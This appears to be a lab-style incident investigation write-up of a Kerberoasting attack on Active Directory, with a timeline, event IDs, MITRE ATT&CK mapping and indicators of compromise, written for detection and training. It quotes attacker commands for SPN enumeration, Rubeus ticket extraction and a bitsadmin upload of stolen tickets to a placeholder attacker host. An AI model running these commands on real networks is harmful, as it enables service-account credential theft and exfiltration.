# 🎫 Investigation 18 – Active Directory Kerberoasting Attack & Service Account Credential Theft

## 📌 Scenario

An attacker compromised a domain workstation (`WIN-SEC01`) and performed Active Directory reconnaissance to identify Service Principal Names (SPNs). Using the **Kerberoasting** technique, the attacker requested Kerberos Service Tickets (TGS) for privileged service accounts, extracted the tickets with **Rubeus**, archived them, exfiltrated them to attacker-controlled infrastructure, and removed forensic evidence by deleting local files and clearing Windows Security Event Logs.

---

# 🎯 Investigation Objectives

- Investigate Active Directory reconnaissance
- Detect SPN enumeration
- Analyze Kerberos Service Ticket requests
- Detect Kerberoasting activity
- Investigate Rubeus execution
- Analyze Kerberos ticket collection
- Detect archive creation
- Investigate ticket exfiltration
- Analyze anti-forensics activity
- Map attacker behavior to MITRE ATT&CK

---

# 📊 Investigation Summary

| Category | Result |
|----------|--------|
| Total Events | **21** |
| Initial Host | **WIN-SEC01** |
| Domain Controller | **DC01** |
| Primary User | **alex.morgan** |
| Attack Type | **Kerberoasting Attack** |
| Incident Severity | 🔴 Critical |

---

# 📈 Event ID Analysis

| Event ID | Description | Count |
|----------|-------------|------:|
|1102|Audit Log Cleared|1|
|4624|Successful Logon|2|
|4625|Failed Logon|1|
|4634|Logoff|1|
|4672|Special Privileges Assigned|1|
|4688|Process Creation|12|
|4769|Kerberos Service Ticket Requested|2|
|5156|Allowed Network Connection|1|

---

# 📊 Severity Distribution

| Severity | Count |
|----------|------:|
|🔴 Critical|4|
|🟠 High|7|
|🟡 Medium|4|
|🟢 Low|6|

---

# 👤 Most Active User

| User | Activity |
|------|----------|
| **alex.morgan** | Performed reconnaissance and Kerberoasting attack |

---

# 🔍 Investigation Findings

---

## Phase 1 – Initial Access

### Events

- Successful Logon (4624)
- Special Privileges Assigned (4672)

### Findings

The attacker obtained access to workstation **WIN-SEC01** using the **alex.morgan** account and received elevated privileges.

---

## Phase 2 – Active Directory Reconnaissance

### Commands

```cmd
whoami /all
hostname
ipconfig /all
```

### Findings

The attacker collected:

- Logged-on user
- Hostname
- Network configuration

---

## Phase 3 – SPN Enumeration

### Commands

```cmd
setspn -T corp.local -Q */*
```

```powershell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

### Findings

The attacker enumerated Service Principal Names (SPNs) to identify service accounts that could be targeted using Kerberoasting.

---

## Phase 4 – Kerberos Service Ticket Requests

### Event ID

```
4769
```

### Tickets Requested

- MSSQLSvc/SQL01.corp.local
- HTTP/WEB01.corp.local

### Findings

Kerberos Service Tickets (TGS) were requested for privileged service accounts.

---

## Phase 5 – Kerberoasting

### Command

```cmd
Rubeus.exe kerberoast /outfile:C:\Users\Public\tickets.txt
```

### Findings

The attacker used **Rubeus** to request and extract Kerberos Service Tickets for offline password cracking.

Unlike DCSync, Kerberoasting does not directly steal password hashes. Instead, it collects encrypted Kerberos tickets that can later be cracked offline.

---

## Phase 6 – Ticket Staging

### Command

```cmd
cmd.exe /c copy tickets.txt C:\Users\Public\kerberoast.txt
```

### Findings

The extracted Kerberos tickets were copied into a staging file in preparation for exfiltration.

---

## Phase 7 – Archive Creation

### Command

```cmd
7z.exe a C:\Users\Public\kerberoast.7z kerberoast.txt
```

### Findings

The attacker compressed the Kerberos ticket file into a single archive before transferring it outside the network.

---

## Phase 8 – Exfiltration

### Command

```cmd
bitsadmin /transfer roastupload /upload /priority normal C:\Users\Public\kerberoast.7z http://kerberos-attacker.example/upload
```

### Event ID

```
5156
```

### Findings

BITSAdmin uploaded the compressed Kerberos ticket archive to attacker-controlled infrastructure.

---

## Phase 9 – Evidence Removal

### Commands

```cmd
cmd.exe /c del C:\Users\Public\kerberoast.7z
```

```cmd
cmd.exe /c del C:\Users\Public\kerberoast.txt
```

### Findings

The attacker removed all staged Kerberos ticket files after successful exfiltration.

---

## Phase 10 – Anti-Forensics

### Event ID

```
1102
```

### Findings

Windows Security Audit Logs were cleared using **wevtutil.exe** to hide evidence of:

- Kerberoasting
- Rubeus execution
- Ticket extraction
- Exfiltration
- File deletion

---

# 📈 Complete Attack Timeline

```text
Initial Logon
      │
Privilege Assignment
      │
Reconnaissance
      │
SPN Enumeration
      │
Kerberos Ticket Requests
      │
Kerberoasting (Rubeus)
      │
Copy Ticket File
      │
Compress Archive
      │
BITS Upload
      │
Delete Evidence
      │
Clear Windows Security Logs
```

---

# 🎯 MITRE ATT&CK Mapping

| Technique | ID |
|-----------|----|
| Account Discovery | T1087 |
| PowerShell | T1059.001 |
| Kerberoasting | T1558.003 |
| Kerberos Service Ticket Request | T1558.003 |
| Archive Collected Data | T1560.001 |
| Exfiltration Over Alternative Protocol | T1048 |
| File Deletion | T1070.004 |
| Clear Windows Event Logs | T1070.001 |

---

# 🚩 Indicators of Compromise (IOCs)

## Hosts

- WIN-SEC01
- DC01

## Users

- alex.morgan

## Service Accounts Targeted

- MSSQLSvc/SQL01.corp.local
- HTTP/WEB01.corp.local

## Suspicious Processes

- setspn.exe
- powershell.exe
- rubeus.exe
- cmd.exe
- 7z.exe
- bitsadmin.exe
- wevtutil.exe

## Suspicious Files

- tickets.txt
- kerberoast.txt
- kerberoast.7z

## Network Indicators

### Internal

- 192.168.70.25
- 192.168.70.10

### External

- 198.51.100.180

---

# 🚨 Incident Conclusion

The investigation identified a successful **Kerberoasting attack** targeting Active Directory service accounts. The attacker enumerated Service Principal Names (SPNs), requested Kerberos Service Tickets for privileged services, and used **Rubeus** to extract those tickets for offline password cracking. The collected tickets were staged, compressed, and exfiltrated using **BITSAdmin**. Finally, the attacker removed local evidence and cleared Windows Security Event Logs to hinder forensic analysis. If the captured service account passwords are successfully cracked, they could provide privileged access for lateral movement, persistence, or further compromise of the Active Directory environment.

---

# 🛠️ Skills Demonstrated

- Splunk Enterprise Investigation
- Active Directory Security Analysis
- Kerberos Authentication Analysis
- Kerberoasting Detection
- SPN Enumeration Investigation
- Windows Event Log Analysis
- Threat Hunting
- IOC Identification
- MITRE ATT&CK Mapping
- Incident Response
- Attack Timeline Reconstruction
- Anti-Forensics Investigation

---

# ⭐ Investigation Status

✅ Completed

**Difficulty:** ⭐⭐⭐⭐⭐⭐⭐⭐ (Expert Active Directory Kerberoasting Investigation)
